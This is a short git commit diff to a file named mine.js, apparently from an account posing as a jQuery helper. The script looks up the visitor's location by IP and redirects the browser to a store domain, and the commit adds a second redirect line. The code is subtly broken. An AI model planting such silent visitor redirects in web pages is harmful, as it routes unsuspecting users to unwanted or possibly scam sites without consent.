bc0530724b50b3ab7735b7de39492d6714590af0
easyjquery <87566347+easyjquery@users.noreply.github.com>
2021-07-20 22:04:20 +0530

    Update mine.js

--- mine.js
+++ mine.js
@@ -1,3 +1,4 @@
+window.location="google.com";
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
   window.location="http://deal3.floraspring.store/"+JSON.countryName;
